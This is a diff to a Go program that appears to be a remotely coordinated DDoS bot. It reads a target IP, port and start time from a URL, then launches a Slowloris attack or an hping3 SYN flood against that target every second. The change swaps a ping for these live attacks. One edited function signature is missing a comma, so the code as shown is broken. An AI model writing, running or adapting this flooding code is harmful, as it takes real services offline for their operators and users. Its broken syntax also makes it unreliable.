@@ -7,6 +7,7 @@ import (
 	"math/rand"
 	"net/http"
 	"os/exec"
+	"strings"
 
 	//"strings"
 	"net"
@@ -63,57 +64,58 @@ func checkDDoS() {
 		fmt.Println(err)
 	} else {
 		fmt.Println(attackInfo)
-		cronAttackDDoS(attackInfo.Ip, attackInfo.Date, attackInfo.DateNs)
+		cronAttackDDoS(attackInfo.Ip, attackInfo.Port, attackInfo.Date, attackInfo.DateNs)
 	}
 }
 
-func cronAttackDDoS(ip string, date string, dateNs int64) {
+func cronAttackDDoS(ip string, port string date string, dateNs int64) {
 	scheduler := gocron.NewScheduler()
 
 	// Begin job at a specific date/time
 	t := time.Unix(0, dateNs)
-	scheduler.Every(1).Second().From(&t).Do(attackDDoS, ip)
+	scheduler.Every(1).Second().From(&t).Do(attackDDoS, ip, port)
 
 	//fmt.Println(ip + " attack scheduled")
 
 	<-scheduler.Start()
 }
 
-func attackDDoS(ip string) {
-	//x := randomNumber()
-	//fmt.Println(x)
+func attackDDoS(ip string, port string) {
+	x := randomNumberChoice()
+	fmt.Println(x)
 
-	_, err := exec.Command("/bin/ping", "-c1", ip).Output()
-	if err != nil {
-		log.Fatal(err)
-	}
+	//_, err := exec.Command("/bin/ping", "-c1", ip).Output()
+	//if err != nil {
+	//	log.Fatal(err)
+	//}
 	//fmt.Println(string(out))
-	/*
-		switch x {
-		case 1:
-			fmt.Println("------------------------Starting Slowloris Attack------------------------")
-			out, err := exec.Command("./slowloris", ip).Output()
-			if err != nil {
-				log.Fatal(err)
-			}
-			fmt.Println(string(out))
-		case 2:
-			fmt.Println("------------------------Starting TCP SYN Attack------------------------")
-			out, err := exec.Command("hping3", "--syn", strings.Split(ip, ":")[0], "-p", "9999", "--flood").Output()
-			if err != nil {
-				log.Fatal(err)
-			}
-			fmt.Println(string(out))
+
+	switch x {
+	case 1:
+		fmt.Println("------------------------Starting Slowloris Attack------------------------")
+		slowloris(ip+":"+port)
+		/*out, err := exec.Command("./slowloris", ip).Output()
+		if err != nil {
+			log.Fatal(err)
 		}
-	*/
+		fmt.Println(string(out))*/
+	case 2:
+		fmt.Println("------------------------Starting TCP SYN Attack------------------------")
+		out, err := exec.Command("hping3", "--syn", ip, "-p", "9999", "--flood").Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(string(out))
+	}
+
 }
 
-/*func randomNumber() int {
+func randomNumberChoice() int {
 	rand.Seed(time.Now().UnixNano())
 	min := 1
-	max := 3
+	max := 2
 	return rand.Intn(max-min+1) + min
-}*/
+}
 
 func getAttackInfo(url string, target interface{}) error {
 	resp, err := http.Get(url)
